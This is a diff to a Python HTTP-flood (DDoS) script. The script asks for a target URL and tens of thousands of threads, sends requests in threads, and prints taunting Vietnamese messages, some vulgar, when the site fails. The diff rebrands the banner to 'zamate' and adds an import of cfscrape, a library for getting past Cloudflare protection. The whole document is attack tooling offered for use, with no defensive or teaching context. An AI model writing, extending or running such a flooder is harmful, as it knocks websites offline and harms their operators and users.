@@ -1,5 +1,5 @@
 import urllib.request, os, threading, time, random, sys, requests, requests
-
+import cfscrape
 from colorama import Fore, Style
 import os
 import colorama
@@ -512,7 +512,7 @@ class sender(threading.Thread):
 
         req = urllib.request.Request(self.url, data, self.headers, self.accept)
         urllib.request.urlopen(req)
-        print(Fore.GREEN+'[ZAMATE] Website con cac gi manh vãi lồn thua: '+Fore.CYAN+'%s\r\n' % self.url)  
+        print(Fore.GREEN+'[zamate] Website mạnh quó chịu khong nổi ycuycu: '+Fore.CYAN+'%s\r\n' % self.url)  
         
              
         
@@ -523,7 +523,7 @@ class sender(threading.Thread):
             try:
                 self.request()               
             except:
-                sys.stdout.write(Fore.RED+'[DangVanAn] Connection Website : '+Fore.BLUE+'DIE SEVER 503\n') 
+                sys.stdout.write(Fore.RED+'[zamate] Connection Website : '+Fore.BLUE+'DIE SEVER \n') 
                 sys.exit(0)
 
         sys.exit(0)
@@ -551,13 +551,13 @@ class MainLoop:
                                                  `------'`
 
         ╔═════════════════════════════════╗
-        ║  - - -[Admin: CONCAC]- -     ║    
-        ║           [CAILOLTAONE]           ║
+        ║  - - -[Admin: .I.]- -     ║    
+        ║           [ZAMATE]           ║
         ╚═════════════════════════════════╝
                    
 
    ╔═══════════════════════════════════════════════╗
-   ║   Welcome we created LON TO year 2023    ║
+   ║   Welcome we created cailolcatkhong year 2023    ║
    ╚═══════════════════════════════════════════════╝
 
                                                            
@@ -576,7 +576,7 @@ class MainLoop:
 			#url = sys.argv[1]
             os.system('cls' if os.name == 'nt' else 'clear')
             print(CRED2 + logo + CRED2)
-            url = str(input(f"{Fore.RED}[ZAMATE]   Nhập Url/Target: {Fore.RESET}"))
+            url = str(input(f"{Fore.RED}[zamate]   Nhập Url/Target: {Fore.RESET}"))
         except:
             os.system('cls' if os.name == 'nt' else 'clear')
 			#url = sys.argv[1]
@@ -591,7 +591,7 @@ class MainLoop:
             else:
 				#num_threads = sys.argv[2]
                 #num_threads = int(input("threads: "))
-                num_threads = str(input(f"{Fore.RED}[Manh len anh oi]   Threads (10000000): {Fore.RESET}"))
+                num_threads = str(input(f"{Fore.RED}[zamate]   Threads (10000000): {Fore.RESET}"))
                 if num_threads == '':
                     #num_threads = int(80000)
                      num_threads = int(random.randint(20000, 30000))
